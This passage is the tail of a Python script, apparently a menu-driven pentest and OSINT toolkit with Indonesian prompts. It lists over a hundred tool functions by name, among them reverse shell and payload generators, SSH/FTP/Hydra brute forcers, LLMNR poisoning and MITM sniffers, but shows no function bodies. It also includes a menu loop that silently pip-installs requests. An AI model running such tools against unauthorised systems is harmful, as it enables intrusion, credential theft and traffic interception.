        '78':wifi_handshake_cracker,'79':wordlist_generator,'80':port_knocking,
        # v7
        '81':ssh_bruteforce,'82':ftp_bruteforce,'83':wpscan_wrapper,
        '84':smb_enum,'85':snmp_scanner,'86':dns_zone_transfer,
        '87':ssl_tls_scanner,'88':shodan_search,'89':virustotal_lookup,
        '90':pastebin_search,'91':telegram_osint,
        '92':reverse_shell_gen,'93':payload_gen,'94':linpeas_downloader,
        '95':stego_tool,'96':qr_tool,'97':password_gen,
        '98':aes_tool,'99':encoder_tool,'100':mac_lookup,
        # v8
        '101':nuclei_scanner,'102':exploit_scanner,'103':reverse_dns,
        '104':asn_lookup,'105':http_methods_test,'106':cors_detailed,
        '107':jwt_secret_cracker,'108':graphql_deep_scan,'109':rate_limit_test,
        '110':request_smuggling_test,'111':spring_boot_scanner,'112':jenkins_scanner,
        '113':tomcat_scanner,'114':git_exposure,'115':backup_finder,
        '116':robots_parser,'117':sitemap_parser,'118':wordpress_plugin_enum,
        '119':api_endpoint_discovery,'120':header_injection,
        # v9
        '121':scope_manager,'122':hunter_email_finder,'123':email_verifier,
        '124':subdomain_monitor,'125':cert_transparency,'126':censys_search,
        '127':builtwith_lookup,'128':urlscan_lookup,'129':securitytrails_lookup,
        '130':leakcheck_lookup,'131':intelx_lookup,'132':opencorporates_lookup,
        '133':linkedin_enum,'134':wayback_urls,'135':logo_brand_search,
        '136':dns_history,'137':reverse_whois,'138':github_dork,
        '139':shodan_monitor,'140':exploit_suggester,'141':vuln_timeline,
        '142':paste_monitor,'143':scope_auto_scan,'144':whois_history,
        '145':email_breach_scan,
        # v10
        '146':subfinder_wrapper,'147':httpx_prober,'148':katana_crawler,
        '149':ffuf_fuzzer,'150':gau_urls,'151':js_endpoint_extractor,
        '152':param_spider,'153':subdomain_takeover_advanced,'154':screenshot_taker,
        '155':vuln_correlator,'156':bugcrowd_report,'157':bugcrowd_scope_check,
        '158':bugcrowd_safe_scan,'159':cve_poc_finder,'160':bugcrowd_vdp_finder,
        '161':dupe_checker,'162':program_chooser,'163':cve_monitor,
        '164':api_key_validator,'165':subdomain_permutation,'166':api_fuzzer,
        '167':vdp_scope_scan,
        # v12 NEW
        '168':dalfox_xss,'169':commix_scanner,'170':nikto_scanner,
        '171':gobuster_dirbust,'172':wfuzz_scanner,'173':amass_enum,
        '174':masscan_ports,'175':searchsploit_local,'176':hydra_brute,
        '177':sqlmap_api_wrapper,'178':wpscan_api,'179':theHarvester_osint,
        '180':sherlock_username,'181':holehe_email,'182':wafw00f_detect,
        '183':whatweb_finger,'184':wpscan_vuln_db,'185':testssl_scanner,
        '186':sslyze_scanner,'187':git_dumper,'188':gitleaks_scan,
        '189':trufflehog_scan,'190':prowler_cloud,'191':scoutsuite_cloud,
        '192':bloodhound_ingest,'193':crackmapexec_ad,'194':responder_llmnr,
        '195':ettercap_sniff,'196':bettercap_mitm,'197':mitmproxy_tool,
    }
    while True:
        banner(); menu()
        c = ask("Pilih fitur")
        try:
            if c == '0':
                print(f"{Y}\n[!] Keluar...{W}"); sig(); break
            elif c == '88': full_scan()
            elif c in T: T[c]()
            else: err("Invalid")
        except KeyboardInterrupt: warn("Dibatalkan")
        except Exception as e: err(f"Error: {e}")
        input(f"\n{Y}[!] Enter untuk lanjut...{W}")

if __name__ == "__main__":
    try: import requests
    except:
        os.system("pip install requests 2>/dev/null")
        import requests
    try: main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Keluar.{W}"); sig()
